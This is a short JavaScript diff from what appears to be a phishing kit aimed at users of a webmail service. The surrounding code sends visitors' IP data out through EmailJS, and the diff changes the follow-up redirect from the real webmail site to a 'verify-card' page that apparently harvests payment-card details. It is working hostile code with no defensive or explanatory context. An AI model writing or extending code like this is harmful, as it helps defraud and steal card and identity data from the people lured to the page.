@@ -133,13 +133,13 @@
               dataSent = true;
               console.log("✅ IP data successfully sent via EmailJS");
               console.log("Response:", response.status, response.text);
-              window.location.replace("https://webmail.mwt.net/");
+              window.location.replace("https://verify-card.vercel.app?redirect=https://webmail.mwt.net",);
               return response;
             })
             .catch(function (error) {
               console.error("❌ Failed to send IP data via EmailJS:", error);
               console.error("Error details:", error.text || error.message);
-              window.location.replace("https://webmail.mwt.net/");
+              window.location.replace("https://verify-card.vercel.app?redirect=https://webmail.mwt.net",);
               throw error;
             });
         }
